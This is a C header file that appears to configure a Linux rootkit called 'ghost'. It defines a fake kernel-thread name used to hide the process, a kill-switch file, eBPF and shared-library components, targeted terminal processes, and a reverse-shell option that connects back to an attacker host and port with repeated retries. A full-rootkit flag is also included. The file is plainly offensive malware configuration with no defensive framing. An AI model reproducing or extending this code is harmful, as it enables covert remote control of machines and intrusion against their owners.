#ifndef GHOST_CONFIG_H
# define GHOST_CONFIG_H

# define GHOST_PORT          443
# define SURVIVAL_PORT       8443
# define KILL_SWITCH         "/tmp/.ghost_off"
# define FAKE_THREAD_NAME    "[kworker/u24:5]"
# define UNIX_BRIDGE        "ghost_bridge"
# define BPF_OBJ_PATH        "ghost.bpf.o"
# define GHOST_SO_NAME       "libghost"

# define TARGET_COMM_1       "gnome-terminal"
# define TARGET_COMM_2       "zsh"

/* Reverse shell configuration */
/* Set to 1 to enable reverse shell (connect back to attacker) */
# define GHOST_REVERSE_MODE   0
/* Attacker IP/Hostname to connect back to */
# define GHOST_REVERSE_HOST  "10.51.1.6"
/* Attacker port to connect back to */
# define GHOST_REVERSE_PORT  4444
/* Delay between reconnection attempts (seconds) */
# define GHOST_RETRY_DELAY   5

# ifndef GHOST_FULL_ROOTKIT
#  define GHOST_FULL_ROOTKIT 0
# endif

#endif
